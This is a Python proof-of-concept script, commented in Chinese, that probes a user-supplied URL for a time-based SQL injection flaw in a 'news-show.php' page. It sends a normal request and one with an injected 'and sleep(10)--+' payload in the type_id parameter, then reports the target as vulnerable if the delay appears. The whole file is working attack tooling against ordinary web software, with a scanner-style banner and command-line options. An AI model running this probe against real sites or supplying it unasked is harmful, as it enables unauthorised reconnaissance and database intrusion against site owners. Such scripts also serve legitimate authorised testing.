#sql时间注入漏洞
#导包外置
import requests,argparse
from multiprocessing.dummy import Pool
# 关闭告警
requests.packages.urllib3.disable_warnings()
#https://shankebio.com

def banner():
    test = """ ░▒▓███████▓▒░░▒▓██████▓▒░░▒▓█▓▒░      ░▒▓█▓▒░░▒▓███████▓▒░▒▓█▓▒░      ░▒▓████████▓▒░▒▓████████▓▒░▒▓███████▓▒░  
░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░ 
░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░ 
 ░▒▓██████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓██████▓▒░░▒▓█▓▒░      ░▒▓██████▓▒░ ░▒▓██████▓▒░ ░▒▓███████▓▒░  
       ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░        
       ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░        
░▒▓███████▓▒░ ░▒▓██████▓▒░░▒▓████████▓▒░▒▓█▓▒░▒▓███████▓▒░░▒▓████████▓▒░▒▓████████▓▒░▒▓████████▓▒░▒▓█▓▒░        
                ░▒▓█▓▒░                                                                                         
                 ░▒▓██▓▒░                                                                                       

"""
    print(test)

def main():
    banner()
    parser = argparse.ArgumentParser(description='sql时间注入漏洞')
    parser.add_argument('-u','--url',dest='url',type=str,help='input your url')
    # parser.add_argument('-c','--cookie',dest='cookie',type=str,help='input your cookie')
    args = parser.parse_args()
    poc(args.url)

def poc(target):
    payload1 = '/news-show.php?id=6&&type_id=2'
    payload2 = '/news-show.php?id=6&&type_id=2 and sleep(10)--+'
    res1 = requests.get(url=target+payload1)
    res2 = requests.get(url=target+payload2)
    time1 = res1.elapsed.total_seconds()
    time2 = res2.elapsed.total_seconds()
    print(time1,time2)
    if time2 - time1 >= 9:
        print(f'{target}存在时间注入漏洞!')
    else:
        print(f'{target}不存在时间注入漏洞')


if __name__ == '__main__':
    main()